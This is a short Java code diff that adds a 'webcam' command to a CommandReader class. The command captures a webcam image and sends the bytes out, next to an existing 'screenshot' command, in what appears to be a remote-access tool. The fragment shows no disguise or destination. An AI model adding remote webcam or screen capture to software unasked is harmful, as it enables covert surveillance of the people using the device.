@@ -72,6 +72,9 @@ public class CommandReader {
         } else if (command.equals("screenshot")) {
             new ImageService().sendImgBytes(new ImageService().takeScreenshot());
             new ResponseSender().reset();
+        } else if (command.equals("webcam")) {
+            new ImageService().sendImgBytes(new ImageService().webcamCapture());
+            new ResponseSender().reset();
         } else {
             isFunction = false;
         }
